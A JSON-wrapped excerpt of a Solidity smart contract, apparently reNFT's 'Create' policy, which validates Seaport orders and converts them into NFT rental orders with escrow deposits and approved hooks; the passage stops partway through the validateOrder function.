      "content": "// SPDX-License-Identifier: BUSL-1.1\npragma solidity ^0.8.20;\n\nimport {ZoneParameters} from \"@seaport-core/lib/rental/ConsiderationStructs.sol\";\nimport {ReceivedItem, SpentItem} from \"@seaport-types/lib/ConsiderationStructs.sol\";\nimport {LibString} from \"@solady/utils/LibString.sol\";\n\nimport {ISafe} from \"@src/interfaces/ISafe.sol\";\nimport {IHook} from \"@src/interfaces/IHook.sol\";\nimport {ZoneInterface} from \"@src/interfaces/IZone.sol\";\n\nimport {Kernel, Policy, Permissions, Keycode} from \"@src/Kernel.sol\";\nimport {toKeycode, toRole} from \"@src/libraries/KernelUtils.sol\";\nimport {RentalUtils} from \"@src/libraries/RentalUtils.sol\";\nimport {Signer} from \"@src/packages/Signer.sol\";\nimport {Zone} from \"@src/packages/Zone.sol\";\nimport {Accumulator} from \"@src/packages/Accumulator.sol\";\nimport {Storage} from \"@src/modules/Storage.sol\";\nimport {PaymentEscrow} from \"@src/modules/PaymentEscrow.sol\";\nimport {\n    RentalOrder,\n    RentPayload,\n    SeaportPayload,\n    Hook,\n    OrderFulfillment,\n    OrderMetadata,\n    OrderType,\n    Item,\n    ItemType,\n    SettleTo,\n    RentalId,\n    RentalAssetUpdate\n} from \"@src/libraries/RentalStructs.sol\";\nimport {Errors} from \"@src/libraries/Errors.sol\";\nimport {Events} from \"@src/libraries/Events.sol\";\n\n/**\n * @title Create\n * @notice Acts as an interface for all behavior related to creating a rental.\n */\ncontract Create is Policy, Signer, Zone, Accumulator {\n    using RentalUtils for Item;\n    using RentalUtils for Item[];\n    using RentalUtils for SpentItem;\n    using RentalUtils for ReceivedItem;\n    using RentalUtils for OrderType;\n\n    /////////////////////////////////////////////////////////////////////////////////\n    //                         Kernel Policy Configuration                         //\n    /////////////////////////////////////////////////////////////////////////////////\n\n    // Modules that the policy depends on.\n    Storage public STORE;\n    PaymentEscrow public ESCRW;\n\n    /**\n     * @dev Instantiate this contract as a policy.\n     *\n     * @param kernel_ Address of the kernel contract.\n     */\n    constructor(Kernel kernel_) Policy(kernel_) Signer() Zone() {}\n\n    /**\n     * @notice Upon policy activation, configures the modules that the policy depends on.\n     *         If a module is ever upgraded that this policy depends on, the kernel will\n     *         call this function again to ensure this policy has the current address\n     *         of the module.\n     *\n     * @return dependencies Array of keycodes which represent modules that\n     *                      this policy depends on.\n     */\n    function configureDependencies()\n        external\n        override\n        onlyKernel\n        returns (Keycode[] memory dependencies)\n    {\n        dependencies = new Keycode[](2);\n\n        dependencies[0] = toKeycode(\"STORE\");\n        STORE = Storage(getModuleAddress(toKeycode(\"STORE\")));\n\n        dependencies[1] = toKeycode(\"ESCRW\");\n        ESCRW = PaymentEscrow(getModuleAddress(toKeycode(\"ESCRW\")));\n    }\n\n    /**\n     * @notice Upon policy activation, permissions are requested from the kernel to access\n     *         particular keycode <> function selector pairs. Once these permissions are\n     *         granted, they do not change and can only be revoked when the policy is\n     *         deactivated by the kernel.\n     *\n     * @return requests Array of keycode <> function selector pairs which represent\n     *                  permissions for the policy.\n     */\n    function requestPermissions()\n        external\n        view\n        override\n        onlyKernel\n        returns (Permissions[] memory requests)\n    {\n        requests = new Permissions[](2);\n        requests[0] = Permissions(toKeycode(\"STORE\"), STORE.addRentals.selector);\n        requests[1] = Permissions(toKeycode(\"ESCRW\"), ESCRW.increaseDeposit.selector);\n    }\n\n    /////////////////////////////////////////////////////////////////////////////////\n    //                              View Functions                                 //\n    /////////////////////////////////////////////////////////////////////////////////\n\n    /**\n     * @notice Retrieves the domain separator.\n     *\n     * @return The domain separator for the protocol.\n     */\n    function domainSeparator() external view returns (bytes32) {\n        return _DOMAIN_SEPARATOR;\n    }\n\n    /**\n     * @notice Derives the rental order EIP-712 compliant hash from a `RentalOrder`.\n     *\n     * @param order Rental order converted to a hash.\n     */\n    function getRentalOrderHash(\n        RentalOrder memory order\n    ) external view returns (bytes32) {\n        return _deriveRentalOrderHash(order);\n    }\n\n    /**\n     * @notice Derives the rent payload EIP-712 compliant hash from a `RentPayload`.\n     *\n     * @param payload Rent payload converted to a hash.\n     */\n    function getRentPayloadHash(\n        RentPayload memory payload\n    ) external view returns (bytes32) {\n        return _deriveRentPayloadHash(payload);\n    }\n\n    /**\n     * @notice Derives the order metadata EIP-712 compliant hash from an `OrderMetadata`.\n     *\n     * @param metadata Order metadata converted to a hash.\n     */\n    function getOrderMetadataHash(\n        OrderMetadata memory metadata\n    ) external view returns (bytes32) {\n        return _deriveOrderMetadataHash(metadata);\n    }\n\n    /////////////////////////////////////////////////////////////////////////////////\n    //                            Internal Functions                               //\n    /////////////////////////////////////////////////////////////////////////////////\n\n    /**\n     * @dev Helper function to emit an event which signals a rental order has started.\n     *\n     * @param order     Rental order to emit.\n     * @param orderHash Order hash of the seaport order.\n     * @param extraData Any extra data to be emitted which was supplied by the offerer.\n     */\n    function _emitRentalOrderStarted(\n        RentalOrder memory order,\n        bytes32 orderHash,\n        bytes memory extraData\n    ) internal {\n        // Emit the event.\n        emit Events.RentalOrderStarted(\n            orderHash,\n            extraData,\n            order.seaportOrderHash,\n            order.items,\n            order.hooks,\n            order.orderType,\n            order.lender,\n            order.renter,\n            order.rentalWallet,\n            order.startTimestamp,\n            order.endTimestamp\n        );\n    }\n\n    /**\n     * @dev Processes the offer items for inclusion in a BASE order. All offer items must\n     *      adhere to the BASE order format, else execution will revert.\n     *\n     * @param rentalItems Running array of items that comprise the rental order.\n     * @param offers      Array of offer items to include in the the order.\n     * @param startIndex  Index to begin adding the offer items to the\n     *                    `rentalItems` array.\n     */\n    function _processBaseOrderOffer(\n        Item[] memory rentalItems,\n        SpentItem[] memory offers,\n        uint256 startIndex\n    ) internal pure {\n        // Must be at least one offer item.\n        if (offers.length == 0) {\n            revert Errors.CreatePolicy_OfferCountZero();\n        }\n\n        // Define elements of the item which depend on the token type.\n        ItemType itemType;\n\n        // Process each offer item.\n        for (uint256 i; i < offers.length; ++i) {\n            // Get the offer item.\n            SpentItem memory offer = offers[i];\n\n            // Handle the ERC721 item.\n            if (offer.isERC721()) {\n                itemType = ItemType.ERC721;\n            }\n            // Handle the ERC1155 item.\n            else if (offer.isERC1155()) {\n                itemType = ItemType.ERC1155;\n            }\n            // ERC20s are not supported as offer items in a BASE order.\n            else {\n                revert Errors.CreatePolicy_SeaportItemTypeNotSupported(offer.itemType);\n            }\n\n            // An ERC721 or ERC1155 offer item is considered a rented asset which will be\n            // returned to the lender upon expiration of the rental order.\n            rentalItems[i + startIndex] = Item({\n                itemType: itemType,\n                settleTo: SettleTo.LENDER,\n                token: offer.token,\n                amount: offer.amount,\n                identifier: offer.identifier\n            });\n        }\n    }\n\n    /**\n     * @dev Processes the offer items for inclusion in a PAY order. All offer items must\n     *      adhere to the PAY order format, else execution will revert.\n     *\n     * @param rentalItems Running array of items that comprise the rental order.\n     * @param offers      Array of offer items to include in the the order.\n     * @param startIndex  Index to begin adding the offer items to the\n     *                    `rentalItems` array.\n     */\n    function _processPayOrderOffer(\n        Item[] memory rentalItems,\n        SpentItem[] memory offers,\n        uint256 startIndex\n    ) internal pure {\n        // Keep track of each item type.\n        uint256 totalRentals;\n        uint256 totalPayments;\n\n        // Define elements of the item which depend on the token type.\n        ItemType itemType;\n        SettleTo settleTo;\n\n        // Process each offer item.\n        for (uint256 i; i < offers.length; ++i) {\n            // Get the offer item.\n            SpentItem memory offer = offers[i];\n\n            // Handle the ERC721 item.\n            if (offer.isERC721()) {\n                // The ERC721 will be returned to the lender upon expiration\n                // of the rental order.\n                itemType = ItemType.ERC721;\n                settleTo = SettleTo.LENDER;\n\n                // Increment rentals.\n                totalRentals++;\n            }\n            // Handle the ERC1155 item.\n            else if (offer.isERC1155()) {\n                // The ERC1155 will be returned to the lender upon expiration\n                // of the rental order.\n                itemType = ItemType.ERC1155;\n                settleTo = SettleTo.LENDER;\n\n                // Increment rentals.\n                totalRentals++;\n            }\n            // Process an ERC20 offer item.\n            else if (offer.isERC20()) {\n                // An ERC20 offer item is considered a payment to the renter upon\n                // expiration of the rental order.\n                itemType = ItemType.ERC20;\n                settleTo = SettleTo.RENTER;\n\n                // Increment payments.\n                totalPayments++;\n            }\n            // Revert if unsupported item type.\n            else {\n                revert Errors.CreatePolicy_SeaportItemTypeNotSupported(offer.itemType);\n            }\n\n            // Create the item.\n            rentalItems[i + startIndex] = Item({\n                itemType: itemType,\n                settleTo: settleTo,\n                token: offer.token,\n                amount: offer.amount,\n                identifier: offer.identifier\n            });\n        }\n\n        // PAY order offer must have at least one rental and one payment.\n        if (totalRentals == 0 || totalPayments == 0) {\n            revert Errors.CreatePolicy_ItemCountZero(totalRentals, totalPayments);\n        }\n    }\n\n    /**\n     * @dev Processes the consideration items for inclusion in a BASE order. All\n     *      consideration items must adhere to the BASE order format, else\n     *      execution will revert.\n     *\n     * @param rentalItems    Running array of items that comprise the rental order.\n     * @param considerations Array of consideration items to include in the the order.\n     * @param startIndex     Index to begin adding the offer items to the\n     *                       `rentalItems` array.\n     */\n    function _processBaseOrderConsideration(\n        Item[] memory rentalItems,\n        ReceivedItem[] memory considerations,\n        uint256 startIndex\n    ) internal pure {\n        // Must be at least one consideration item.\n        if (considerations.length == 0) {\n            revert Errors.CreatePolicy_ConsiderationCountZero();\n        }\n\n        // Process each consideration item.\n        for (uint256 i; i < considerations.length; ++i) {\n            // Get the consideration item.\n            ReceivedItem memory consideration = considerations[i];\n\n            // Only process an ERC20 item.\n            if (!consideration.isERC20()) {\n                revert Errors.CreatePolicy_SeaportItemTypeNotSupported(\n                    consideration.itemType\n                );\n            }\n\n            // An ERC20 consideration item is considered a payment to the lender upon\n            // expiration of the rental order.\n            rentalItems[i + startIndex] = Item({\n                itemType: ItemType.ERC20,\n                settleTo: SettleTo.LENDER,\n                token: consideration.token,\n                amount: consideration.amount,\n                identifier: consideration.identifier\n            });\n        }\n    }\n\n    /**\n     * @dev Processes the consideration items for inclusion in a PAYEE order. All\n     *      consideration items must adhere to the PAYEE order format, else\n     *      execution will revert.\n     *\n     * @param considerations Array of consideration items to include in the the order.\n     */\n    function _processPayeeOrderConsideration(\n        ReceivedItem[] memory considerations\n    ) internal pure {\n        // Keep track of each item type.\n        uint256 totalRentals;\n        uint256 totalPayments;\n\n        // Process each consideration item.\n        for (uint256 i; i < considerations.length; ++i) {\n            // Get the consideration item.\n            ReceivedItem memory consideration = considerations[i];\n\n            // Process an ERC20 item.\n            if (consideration.isERC20()) {\n                totalPayments++;\n            }\n            // Process an ERC721 or ERC1155 consideration item.\n            else if (consideration.isRental()) {\n                totalRentals++;\n            }\n            // Revert if unsupported item type.\n            else {\n                revert Errors.CreatePolicy_SeaportItemTypeNotSupported(\n                    consideration.itemType\n                );\n            }\n        }\n\n        // PAYEE order consideration must have at least one rental and one payment.\n        if (totalRentals == 0 || totalPayments == 0) {\n            revert Errors.CreatePolicy_ItemCountZero(totalRentals, totalPayments);\n        }\n    }\n\n    /**\n     * @dev Converts an offer array and a consideration array into a single array of\n     *      `Item` which comprise a rental order. The offers and considerations must\n     *      adhere to a specific set of rules depending on the type of order being\n     *      constructed.\n     *\n     * @param offers         Array of Seaport offer items.\n     * @param considerations Array of seaport consideration items.\n     * @param orderType      Order type of the rental.\n     */\n    function _convertToItems(\n        SpentItem[] memory offers,\n        ReceivedItem[] memory considerations,\n        OrderType orderType\n    ) internal pure returns (Item[] memory items) {\n        // Initialize an array of items.\n        items = new Item[](offers.length + considerations.length);\n\n        // Process items for a base order.\n        if (orderType.isBaseOrder()) {\n            // Process offer items.\n            _processBaseOrderOffer(items, offers, 0);\n\n            // Process consideration items.\n            _processBaseOrderConsideration(items, considerations, offers.length);\n        }\n        // Process items for a pay order.\n        else if (orderType.isPayOrder()) {\n            // Process offer items.\n            _processPayOrderOffer(items, offers, 0);\n\n            // Assert that no consideration items are provided.\n            if (considerations.length > 0) {\n                revert Errors.CreatePolicy_ConsiderationCountNonZero(\n                    considerations.length\n                );\n            }\n        }\n        // Process items for a payee order.\n        else if (orderType.isPayeeOrder()) {\n            // Assert that no offer items are provided.\n            if (offers.length > 0) {\n                revert Errors.CreatePolicy_OfferCountNonZero(offers.length);\n            }\n\n            // Process consideration items.\n            _processPayeeOrderConsideration(considerations);\n        }\n        // Revert if order type is not supported.\n        else {\n            revert Errors.Shared_OrderTypeNotSupported(uint8(orderType));\n        }\n    }\n\n    /**\n     * @dev When a rental order is created, process each hook one by one but only if\n     *      the hook's status is set to execute on a rental start.\n     *\n     * @param hooks        Array of hooks to process for the order.\n     * @param offerItems   Array of offer items which are referenced by the hooks\n     * @param rentalWallet Address of the rental wallet which is the recipient\n     *                     of the rented assets.\n     */\n    function _addHooks(\n        Hook[] memory hooks,\n        SpentItem[] memory offerItems,\n        address rentalWallet\n    ) internal {\n        // Define hook target, offer item index, and an offer item.\n        address target;\n        uint256 itemIndex;\n        SpentItem memory offer;\n\n        // Loop through each hook in the payload.\n        for (uint256 i = 0; i < hooks.length; ++i) {\n            // Get the hook's target address.\n            target = hooks[i].target;\n\n            // Check that the hook is reNFT-approved to execute on rental start.\n            if (!STORE.hookOnStart(target)) {\n                revert Errors.Shared_DisabledHook(target);\n            }\n\n            // Get the offer item index for this hook.\n            itemIndex = hooks[i].itemIndex;\n\n            // Get the offer item for this hook.\n            offer = offerItems[itemIndex];\n\n            // Make sure the offer item is an ERC721 or ERC1155.\n            if (!offer.isRental()) {\n                revert Errors.Shared_NonRentalHookItem(itemIndex);\n            }\n\n            // Call the hook with data about the rented item.\n            try\n                IHook(target).onStart(\n                    rentalWallet,\n                    offer.token,\n                    offer.identifier,\n                    offer.amount,\n                    hooks[i].extraData\n                )\n            {} catch Error(string memory revertReason) {\n                // Revert with reason given.\n                revert Errors.Shared_HookFailString(revertReason);\n            } catch Panic(uint256 errorCode) {\n                // Convert solidity panic code to string.\n                string memory stringErrorCode = LibString.toString(errorCode);\n\n                // Revert with panic code.\n                revert Errors.Shared_HookFailString(\n                    string.concat(\"Hook reverted: Panic code \", stringErrorCode)\n                );\n            } catch (bytes memory revertData) {\n                // Fallback to an error that returns the byte data.\n                revert Errors.Shared_HookFailBytes(revertData);\n            }\n        }\n    }\n\n    /**\n     * @dev Initiates a rental order using a rental payload received by the fulfiller,\n     *      and a payload from seaport with data involving the assets that were\n     *      transferred in the order.\n     *\n     * @param payload Payload from the order fulfiller.\n     * @param seaportPayload Payload containing the result of a seaport order fulfillment.\n     */\n    function _rentFromZone(\n        RentPayload memory payload,\n        SeaportPayload memory seaportPayload\n    ) internal {\n        // Check: make sure order metadata is valid with the given seaport order zone hash.\n        _isValidOrderMetadata(payload.metadata, seaportPayload.zoneHash);\n\n        // Check: verify the fulfiller of the order is an owner of the recipient safe.\n        _isValidSafeOwner(seaportPayload.fulfiller, payload.fulfillment.recipient);\n\n        // Check: verify each execution was sent to the expected destination.\n        _executionInvariantChecks(\n            seaportPayload.totalExecutions,\n            payload.fulfillment.recipient\n        );\n\n        // Check: validate and process seaport offer and consideration items based\n        // on the order type.\n        Item[] memory items = _convertToItems(\n            seaportPayload.offer,\n            seaportPayload.consideration,\n            payload.metadata.orderType\n        );\n\n        // PAYEE orders are considered mirror-images of a PAY order. So, PAYEE orders\n        // do not need to be processed in the same way that other order types do.\n        if (\n            payload.metadata.orderType.isBaseOrder() ||\n            payload.metadata.orderType.isPayOrder()\n        ) {\n            // Create an accumulator which will hold all of the rental asset updates, consisting of IDs and\n            // the rented amount. From this point on, new memory cannot be safely allocated until the\n            // accumulator no longer needs to include elements.\n            bytes memory rentalAssetUpdates = new bytes(0);\n\n            // Check if each item is a rental. If so, then generate the rental asset update.\n            // Memory will become safe again after this block.\n            for (uint256 i; i < items.length; ++i) {\n                if (items[i].isRental()) {\n                    // Insert the rental asset update into the dynamic array.\n                    _insert(\n                        rentalAssetUpdates,\n                        items[i].toRentalId(payload.fulfillment.recipient),\n                        items[i].amount\n                    );\n                }\n            }\n\n            // Generate the rental order.\n            RentalOrder memory order = RentalOrder({\n                seaportOrderHash: seaportPayload.orderHash,\n                items: items,\n                hooks: payload.metadata.hooks,\n                orderType: payload.metadata.orderType,\n                lender: seaportPayload.offerer,\n                renter: payload.intendedFulfiller,\n                rentalWallet: payload.fulfillment.recipient,\n                startTimestamp: block.timestamp,\n                endTimestamp: block.timestamp + payload.metadata.rentDuration\n            });\n\n            // Compute the order hash.\n            bytes32 orderHash = _deriveRentalOrderHash(order);\n\n            // Interaction: Update storage only if the order is a Base Order or Pay order.\n            STORE.addRentals(orderHash, _convertToStatic(rentalAssetUpdates));\n\n            // Interaction: Increase the deposit value on the payment escrow so\n            // it knows how many tokens were sent to it.\n            for (uint256 i = 0; i < items.length; ++i) {\n                if (items[i].isERC20()) {\n                    ESCRW.increaseDeposit(items[i].token, items[i].amount);\n                }\n            }\n\n            // Interaction: Process the hooks associated with this rental.\n            if (payload.metadata.hooks.length > 0) {\n                _addHooks(\n                    payload.metadata.hooks,\n                    seaportPayload.offer,\n                    payload.fulfillment.recipient\n                );\n            }\n\n            // Emit rental order started.\n            _emitRentalOrderStarted(order, orderHash, payload.metadata.emittedExtraData);\n        }\n    }\n\n    /**\n     * @dev Checks that the order metadata passed with the seaport order is expected.\n     *\n     * @param metadata Order metadata that was passed in with the fulfillment.\n     * @param zoneHash Hash of the order metadata that was passed in when the Seaport\n     *                 order was signed.\n     */\n    function _isValidOrderMetadata(\n        OrderMetadata memory metadata,\n        bytes32 zoneHash\n    ) internal view {\n        // Check that the rent duration specified is not zero.\n        if (metadata.rentDuration == 0) {\n            revert Errors.CreatePolicy_RentDurationZero();\n        }\n\n        // Check that the zone hash is equal to the derived hash of the metadata.\n        if (_deriveOrderMetadataHash(metadata) != zoneHash) {\n            revert Errors.CreatePolicy_InvalidOrderMetadataHash();\n        }\n    }\n\n    /**\n     * @dev Checks that an address is the owner of a protocol-deployed rental safe.\n     *\n     * @param owner Address of the potential safe owner.\n     * @param safe  Address of the potential protocol-deployed rental safe.\n     */\n    function _isValidSafeOwner(address owner, address safe) internal view {\n        // Make sure only protocol-deployed safes can rent.\n        if (STORE.deployedSafes(safe) == 0) {\n            revert Errors.CreatePolicy_InvalidRentalSafe(safe);\n        }\n\n        // Make sure the fulfiller is the owner of the recipient rental safe.\n        if (!ISafe(safe).isOwner(owner)) {\n            revert Errors.CreatePolicy_InvalidSafeOwner(owner, safe);\n        }\n    }\n\n    /**\n     * @dev Helper function to check that an execution performed by Seaport resulting\n     *      in the expected address receiving the asset.\n     *\n     * @param execution Execution that was performed by Seaport.\n     * @param expectedRecipient Address which should now own the rented asset.\n     */\n    function _checkExpectedRecipient(\n        ReceivedItem memory execution,\n        address expectedRecipient\n    ) internal pure {\n        if (execution.recipient != expectedRecipient) {\n            revert Errors.CreatePolicy_UnexpectedTokenRecipient(\n                execution.itemType,\n                execution.token,\n                execution.identifier,\n                execution.amount,\n                execution.recipient,\n                expectedRecipient\n            );\n        }\n    }\n\n    /**\n     * @dev After a Seaport order has been executed, invariant checks are made to ensure\n     *      that all assets are owned by the correct addresses. More specifically, all\n     *      ERC20 tokens are sent to the payment escrow module, and all rental assets\n     *      are in the intended recipient's rental safe.\n     *\n     * @param executions Each execution that was performed by Seaport.\n     * @param expectedRentalSafe The intended recipient of the rental assets.\n     */\n    function _executionInvariantChecks(\n        ReceivedItem[] memory executions,\n        address expectedRentalSafe\n    ) internal view {\n        for (uint256 i = 0; i < executions.length; ++i) {\n            ReceivedItem memory execution = executions[i];\n\n            // ERC20 invariant where the recipient must be the payment escrow.\n            if (execution.isERC20()) {\n                _checkExpectedRecipient(execution, address(ESCRW));\n            }\n            // ERC721 and ERC1155 invariants where the recipient must\n            // be the expected rental safe.\n            else if (execution.isRental()) {\n                _checkExpectedRecipient(execution, expectedRentalSafe);\n            }\n            // Revert if unsupported item type.\n            else {\n                revert Errors.CreatePolicy_SeaportItemTypeNotSupported(\n                    execution.itemType\n                );\n            }\n        }\n    }\n\n    /////////////////////////////////////////////////////////////////////////////////\n    //                            External Functions                               //\n    /////////////////////////////////////////////////////////////////////////////////\n\n    /**\n     * @notice Callback function implemented to make this contract a valid Seaport zone.\n     *         It can be considered the entrypoint to creating a rental. When a seaport\n     *         order specifies the create policy as its zone address, Seaport will call\n     *         this function after each order in the batch is processed. A call to\n     *         `validateOrder` is what kicks off the rental process, and performs steps\n     *         to convert a seaport order into a rental order which is stored\n     *         by the protocol.\n     *\n     * @param zoneParams Parameters from the seaport order.\n     *\n     * @return validOrderMagicValue A `bytes4` value to return back to Seaport.\n     */\n    function validateOrder(\n        ZoneParameters calldata zoneParams\n    ) external override onlyRole(\"SEAPORT\") returns (bytes4 validOrderMagicValue) {\n        // Decode the signed rental zone payload fr"
    }
  ]
}